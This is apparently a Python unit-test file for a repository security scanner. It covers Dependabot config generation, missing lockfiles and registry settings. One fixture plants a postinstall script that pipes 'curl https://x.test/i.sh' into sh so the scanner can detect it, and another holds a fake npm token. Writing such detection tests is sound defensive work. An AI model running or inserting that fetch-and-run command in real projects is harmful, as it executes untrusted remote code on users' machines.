# butian: allow-secret-fixtures

import json
import os
import subprocess
import tempfile
import unittest

from butian.scripts import finding_utils, repo_checks


def write(path, content):
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


class FindingUtilsTests(unittest.TestCase):
    def test_make_finding_schema(self):
        finding = finding_utils.make_finding(
            "repo.example",
            category="repo_governance",
            severity="medium",
            confidence="high",
            file="example.yml",
            line=3,
            title="标题",
            detail="详情",
            evidence="证据",
            recommendation="建议",
        )

        self.assertEqual(finding["id"], "repo.example")
        self.assertEqual(finding["source"], "builtin")
        self.assertFalse(finding["fixable"])
        self.assertEqual(finding["line"], 3)

    def test_line_for_text_returns_first_match(self):
        with tempfile.TemporaryDirectory(prefix="butian-finding-") as root:
            path = os.path.join(root, "a.txt")
            write(path, "one\ntwo\none\n")

            self.assertEqual(finding_utils.line_for_text(path, "two"), 2)
            self.assertIsNone(finding_utils.line_for_text(path, "missing"))


class RepositoryChecksTests(unittest.TestCase):
    def test_security_policy_is_not_reported_as_repository_check(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            findings = repo_checks.scan_repository_checks(root)

            self.assertFalse(any("security_policy" in f["id"] for f in findings))

    def test_codeowners_is_not_reported_as_repository_check(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, ".github", "CODEOWNERS"), "/src @team\n")

            findings = repo_checks.scan_repository_checks(root)

            self.assertFalse(any("codeowners" in f["id"] for f in findings))

    def test_dependabot_advice_is_skipped_without_github_directory(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, "package.json"), "{}\n")
            write(os.path.join(root, "package-lock.json"), "{}\n")

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertFalse(
                any(f["id"] == "repo.missing_dependabot" for f in findings)
            )

    def test_dependabot_advice_is_skipped_for_github_directory_without_github_remote(
        self,
    ):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            os.makedirs(os.path.join(root, ".github"), exist_ok=True)

            findings = repo_checks.scan_repository_checks(root)

            self.assertFalse(
                any(f["id"] == "repo.missing_dependabot" for f in findings)
            )

    def test_dependabot_advice_is_reported_for_github_remote(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            subprocess.run(
                ["git", "init"], cwd=root, check=True, stdout=subprocess.DEVNULL
            )
            subprocess.run(
                ["git", "remote", "add", "origin", "git@github.com:acme/demo.git"],
                cwd=root,
                check=True,
            )
            write(os.path.join(root, "package.json"), "{}\n")
            write(os.path.join(root, "package-lock.json"), "{}\n")

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(any(f["id"] == "repo.missing_dependabot" for f in findings))
            item = next(f for f in findings if f["id"] == "repo.missing_dependabot")
            self.assertIn("GitHub remote", item["evidence"])
            self.assertEqual(item["file"], ".github/dependabot.yml")
            self.assertEqual(
                item["recommendation"],
                "建议创建覆盖 npm 的配置；推送到 GitHub 后，Dependabot 会按 schedule 检查更新。",
            )
            self.assertEqual(item["fix_config"]["type"], "dependabot_config")
            self.assertIn('package-ecosystem: "npm"', item["fix_config"]["content"])

    def test_dependabot_config_covers_multiple_ecosystems_and_actions(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            subprocess.run(
                ["git", "init"], cwd=root, check=True, stdout=subprocess.DEVNULL
            )
            subprocess.run(
                [
                    "git",
                    "remote",
                    "add",
                    "origin",
                    "https://github.com/acme/polyrepo.git",
                ],
                cwd=root,
                check=True,
            )
            write(os.path.join(root, ".github", "workflows", "ci.yml"), "name: ci\n")

            content = repo_checks.build_dependabot_config(
                root, ecosystems=["npm", "pnpm", "pypi", "go", "crates-io"]
            )

            self.assertIn("version: 2\nupdates:\n", content)
            self.assertEqual(content.count('package-ecosystem: "npm"'), 1)
            self.assertIn('package-ecosystem: "pip"', content)
            self.assertIn('package-ecosystem: "gomod"', content)
            self.assertIn('package-ecosystem: "cargo"', content)
            self.assertIn('package-ecosystem: "github-actions"', content)
            self.assertEqual(content.count('schedule:\n      interval: "weekly"'), 5)

    def test_dependabot_config_detects_all_github_supported_ecosystems(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            files = {
                "bazel/MODULE.bazel": "module(name = 'demo')\n",
                "bun/bun.lock": "\n",
                "ruby/Gemfile": "source 'https://rubygems.org'\n",
                "rust/Cargo.toml": "[package]\nname = 'demo'\nversion = '0.1.0'\n",
                "php/composer.json": "{}\n",
                "conda/environment.yml": "name: demo\n",
                "deno/deno.json": "{}\n",
                ".devcontainer/devcontainer.json": "{}\n",
                "docker/Dockerfile": "FROM alpine:3\n",
                "compose/compose.yaml": "services: {}\n",
                "dotnet/global.json": "{}\n",
                "helm/Chart.yaml": "apiVersion: v2\nname: demo\nversion: 0.1.0\n",
                "elixir/mix.exs": "defmodule Demo.MixProject do\nend\n",
                "julia/Project.toml": "[deps]\n",
                "elm/elm.json": "{}\n",
                ".gitmodules": '[submodule "lib"]\n',
                ".github/workflows/ci.yml": "name: ci\n",
                "go/go.mod": "module example.com/demo\n",
                "gradle/build.gradle": "plugins {}\n",
                "maven/pom.xml": "<project />\n",
                "nix/flake.lock": "{}\n",
                "node/package.json": "{}\n",
                "nuget/app.csproj": "<Project />\n",
                "tofu/main.tofu": 'module "x" {}\n',
                "python/requirements.txt": "requests==2.0.0\n",
                ".pre-commit-config.yaml": "repos: []\n",
                "dart/pubspec.yaml": "name: demo\n",
                "toolchain/rust-toolchain.toml": "[toolchain]\nchannel = 'stable'\n",
                "sbt/build.sbt": 'name := "demo"\n',
                "swift/Package.swift": "// swift-tools-version: 5.9\n",
                "terraform/main.tf": 'resource "x" "y" {}\n',
                "uv/uv.lock": "\n",
                "vcpkg/vcpkg.json": "{}\n",
            }
            for path, content in files.items():
                write(os.path.join(root, path), content)

            content = repo_checks.build_dependabot_config(root)

            expected = {
                "bazel",
                "bun",
                "bundler",
                "cargo",
                "composer",
                "conda",
                "deno",
                "devcontainers",
                "docker",
                "docker-compose",
                "dotnet-sdk",
                "helm",
                "mix",
                "julia",
                "elm",
                "gitsubmodule",
                "github-actions",
                "gomod",
                "gradle",
                "maven",
                "nix",
                "npm",
                "nuget",
                "opentofu",
                "pip",
                "pre-commit",
                "pub",
                "rust-toolchain",
                "sbt",
                "swift",
                "terraform",
                "uv",
                "vcpkg",
            }
            for ecosystem in sorted(expected):
                self.assertIn(f'package-ecosystem: "{ecosystem}"', content)
            self.assertIn('directory: "/node"', content)
            self.assertIn('directory: "/go"', content)
            self.assertIn('directory: "/"', content)

    def test_dependabot_missing_github_actions_ecosystem(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, ".github", "workflows", "ci.yml"), "name: ci\n")
            write(
                os.path.join(root, ".github", "dependabot.yml"),
                "version: 2\nupdates:\n  - package-ecosystem: npm\n",
            )

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(
                any(
                    f["id"] == "repo.dependabot_missing_github_actions"
                    for f in findings
                )
            )
            item = next(
                f
                for f in findings
                if f["id"] == "repo.dependabot_missing_github_actions"
            )
            self.assertEqual(item["severity"], "info")
            self.assertEqual(item["kind"], "maintenance_advice")
            self.assertIn("Action 版本", item["title"])
            self.assertEqual(item["evidence"], "")

    def test_dependabot_does_not_require_github_actions_without_workflows(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(
                os.path.join(root, ".github", "dependabot.yml"),
                "version: 2\nupdates:\n  - package-ecosystem: npm\n",
            )

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertFalse(
                any(
                    f["id"] == "repo.dependabot_missing_github_actions"
                    for f in findings
                )
            )

    def test_detects_manifest_without_lockfile(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, "package.json"), "{}\n")

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(
                any(f["id"] == "supply_chain.lockfile_missing" for f in findings)
            )

    def test_detects_suspicious_postinstall(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, "package-lock.json"), "{}\n")
            write(
                os.path.join(root, "package.json"),
                json.dumps(
                    {"scripts": {"postinstall": "curl https://x.test/i.sh | sh"}}
                ),
            )

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(
                any(
                    f["id"] == "supply_chain.suspicious_install_script"
                    for f in findings
                )
            )

    def test_detects_registry_token_config(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            token = "npm_123456789012345678901234567890123456"
            write(
                os.path.join(root, ".npmrc"),
                f"//registry.npmjs.org/:_authToken={token}\n",
            )

            findings = repo_checks.scan_repository_checks(root)

            self.assertTrue(
                any(f["id"] == "supply_chain.registry_token_config" for f in findings)
            )
            item = next(
                f for f in findings if f["id"] == "supply_chain.registry_token_config"
            )
            self.assertNotIn(token, item["evidence"])
            self.assertIn("_authToken=", item["evidence"])
            self.assertIn("***", item["evidence"])

    def test_detects_registry_source_config(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(
                os.path.join(root, ".npmrc"), "registry=https://registry.npmjs.org/\n"
            )

            findings = repo_checks.scan_repository_checks(root)

            item = next(
                f for f in findings if f["id"] == "supply_chain.registry_config_present"
            )
            self.assertEqual(item["severity"], "low")
            self.assertEqual(item["line"], 1)
            self.assertIn("registry=", item["evidence"])

    def test_ignores_non_source_registry_preferences(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, ".npmrc"), "legacy-peer-deps=true\n")

            findings = repo_checks.scan_repository_checks(root)

            self.assertFalse(
                any(f["id"] == "supply_chain.registry_config_present" for f in findings)
            )

    def test_detects_cargo_registry_section(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(
                os.path.join(root, ".cargo", "config.toml"),
                '[registries.internal]\nindex = "sparse+https://cargo.example.test/index/"\n',
            )

            findings = repo_checks.scan_repository_checks(root)

            item = next(
                f for f in findings if f["id"] == "supply_chain.registry_config_present"
            )
            self.assertEqual(item["file"], ".cargo/config.toml")
            self.assertIn("[registries.internal]", item["evidence"])

    def test_detects_registry_tls_bypass(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, "pip.conf"), "trusted-host = pypi.example.test\n")

            findings = repo_checks.scan_repository_checks(root)

            item = next(
                f for f in findings if f["id"] == "supply_chain.registry_insecure_tls"
            )
            self.assertEqual(item["severity"], "medium")
            self.assertIn("trusted-host", item["evidence"])


if __name__ == "__main__":
    unittest.main()
